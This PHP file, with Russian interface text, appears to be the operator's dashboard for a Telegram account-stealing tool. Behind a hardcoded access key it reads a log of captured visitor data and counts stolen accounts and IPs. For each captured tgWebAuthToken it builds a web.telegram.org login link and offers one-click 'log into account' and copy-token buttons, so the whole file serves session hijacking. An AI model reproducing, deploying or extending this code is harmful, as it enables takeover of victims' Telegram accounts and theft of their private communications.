<?php
/**
 * Admin panel with instant login links
 */

define('ADMIN_KEY', 'NoxClient');
define('LOG_FILE', '/tmp/log.txt');

if (!isset($_GET['key']) || $_GET['key'] !== ADMIN_KEY) {
    http_response_code(403);
    die('Access Denied');
}

$action = $_GET['action'] ?? 'view';

if ($action === 'clear' && isset($_GET['confirm'])) {
    @unlink(LOG_FILE);
    header('Location: ?key=' . ADMIN_KEY);
    exit;
}

// Функция для создания ссылки входа
function makeLoginLink($token, $user_id, $dc_id = '2') {
    return "https://web.telegram.org/k/#tgWebAuthToken=" . urlencode($token) . 
           "&tgWebAuthUserId=" . urlencode($user_id) . 
           "&tgWebAuthDcId=" . urlencode($dc_id);
}

echo "<!DOCTYPE html>
<html>
<head>
    <title>Telegram Logger - Login Links</title>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; margin: 0; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #58a6ff; }
        .stats-bar { background: #161b22; padding: 15px; border-radius: 8px; margin: 20px 0; display: flex; gap: 20px; flex-wrap: wrap; }
        .stat-item { background: #21262d; padding: 10px 15px; border-radius: 6px; }
        .stat-label { color: #8b949e; font-size: 12px; }
        .stat-value { color: #58a6ff; font-size: 24px; font-weight: bold; }
        .menu { margin: 20px 0; }
        .menu a { color: #58a6ff; text-decoration: none; margin-right: 15px; padding: 8px 15px; background: #21262d; border-radius: 6px; display: inline-block; }
        .menu a:hover { background: #30363d; }
        .log-entry { background: #161b22; margin: 15px 0; padding: 20px; border-radius: 8px; border-left: 4px solid #238636; }
        .login-link { background: #238636; color: white; padding: 12px 20px; border-radius: 6px; text-decoration: none; display: inline-block; margin: 10px 0; font-weight: bold; }
        .login-link:hover { background: #2ea043; }
        .copy-link { background: #21262d; color: #58a6ff; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin-left: 10px; border: 1px solid #30363d; }
        .token-info { background: #0d1117; padding: 15px; border-radius: 6px; margin: 10px 0; }
        .token-code { background: #21262d; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; }
        .ip { color: #79c0ff; }
        .time { color: #ff7b72; }
        .actions { margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
        .btn { padding: 8px 15px; border-radius: 4px; text-decoration: none; color: white; }
        .btn-primary { background: #238636; }
        .btn-secondary { background: #21262d; color: #c9d1d9; }
        .btn-danger { background: #da3633; }
        .toast { position: fixed; bottom: 20px; right: 20px; background: #238636; color: white; padding: 12px 24px; border-radius: 6px; display: none; }
    </style>
</head>
<body>
    <div class='container'>
        <h1>🔐 Telegram Account Logger</h1>
        
        <div class='menu'>
            <a href='?key=" . ADMIN_KEY . "'>📋 Все записи</a>
            <a href='?key=" . ADMIN_KEY . "&action=tokens'>🔑 Только токены</a>
            <a href='?key=" . ADMIN_KEY . "&action=stats'>📊 Статистика</a>
            <a href='?key=" . ADMIN_KEY . "&action=clear&confirm=1' onclick='return confirm(\"Очистить все логи?\")'>🗑️ Очистить</a>
        </div>";

if (file_exists(LOG_FILE)) {
    $logs = file(LOG_FILE);
    $logs = array_reverse($logs);
    
    // Статистика
    $total = count($logs);
    $tokens_count = 0;
    $unique_ips = [];
    
    foreach ($logs as $line) {
        $data = json_decode(trim($line), true);
        if ($data) {
            if ($data['token_found'] ?? false) $tokens_count++;
            if (isset($data['ip'])) $unique_ips[$data['ip']] = true;
        }
    }
    
    echo "<div class='stats-bar'>
            <div class='stat-item'><span class='stat-label'>Всего записей</span><div class='stat-value'>$total</div></div>
            <div class='stat-item'><span class='stat-label'>Аккаунтов</span><div class='stat-value'>$tokens_count</div></div>
            <div class='stat-item'><span class='stat-label'>Уникальных IP</span><div class='stat-value'>" . count($unique_ips) . "</div></div>
          </div>";
    
    // Фильтр по типу
    $show_only_tokens = ($action === 'tokens');
    
    foreach ($logs as $index => $line) {
        $data = json_decode(trim($line), true);
        if (!$data) continue;
        
        // Пропускаем если фильтр по токенам и токена нет
        if ($show_only_tokens && !($data['token_found'] ?? false)) continue;
        
        $has_token = isset($data['get']['tgWebAuthToken']) && !empty($data['get']['tgWebAuthToken']);
        $token = $data['get']['tgWebAuthToken'] ?? '';
        $user_id = $data['get']['tgWebAuthUserId'] ?? '';
        $dc_id = $data['get']['tgWebAuthDcId'] ?? '2';
        
        echo "<div class='log-entry'>";
        echo "<div style='display: flex; justify-content: space-between; align-items: center;'>";
        echo "<div><span class='time'>🕐 " . htmlspecialchars($data['time']) . "</span> | <span class='ip'>📡 " . htmlspecialchars($data['ip']) . "</span></div>";
        if ($has_token) {
            echo "<span style='background: #238636; padding: 4px 10px; border-radius: 20px; font-size: 12px;'>🔑 TOKEN</span>";
        }
        echo "</div>";
        
        if ($has_token) {
            $login_url = makeLoginLink($token, $user_id, $dc_id);
            
            echo "<div class='token-info'>";
            echo "<div><strong>👤 User ID:</strong> <code>" . htmlspecialchars($user_id) . "</code></div>";
            echo "<div><strong>🌐 DC:</strong> " . htmlspecialchars($dc_id) . "</div>";
            echo "<div><strong>🔑 Token:</strong></div>";
            echo "<div class='token-code'>" . htmlspecialchars($token) . "</div>";
            echo "</div>";
            
            echo "<div class='actions'>";
            echo "<a href='" . htmlspecialchars($login_url) . "' target='_blank' class='btn btn-primary' style='padding: 10px 20px;'>🚀 ВОЙТИ В АККАУНТ</a>";
            echo "<button class='btn btn-secondary' onclick='copyToClipboard(\"" . htmlspecialchars($login_url) . "\")'>📋 КОПИРОВАТЬ ССЫЛКУ</button>";
            echo "<button class='btn btn-secondary' onclick='copyToClipboard(\"" . htmlspecialchars($token) . "\")'>🔑 КОПИРОВАТЬ ТОКЕН</button>";
            echo "</div>";
        }
        
        echo "<details style='margin-top: 15px;'>";
        echo "<summary style='color: #8b949e; cursor: pointer;'>📦 Показать все данные</summary>";
        echo "<pre style='background: #0d1117; padding: 10px; border-radius: 4px; margin-top: 10px;'>" . htmlspecialchars(json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
        echo "</details>";
        
        echo "</div>";
    }
} else {
    echo "<p>Логов пока нет</p>";
}

echo "</div>

<div id='toast' class='toast'>Скопировано!</div>

<script>
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        var toast = document.getElementById('toast');
        toast.style.display = 'block';
        setTimeout(function() {
            toast.style.display = 'none';
        }, 2000);
    });
}
</script>

</body>
</html>";
?>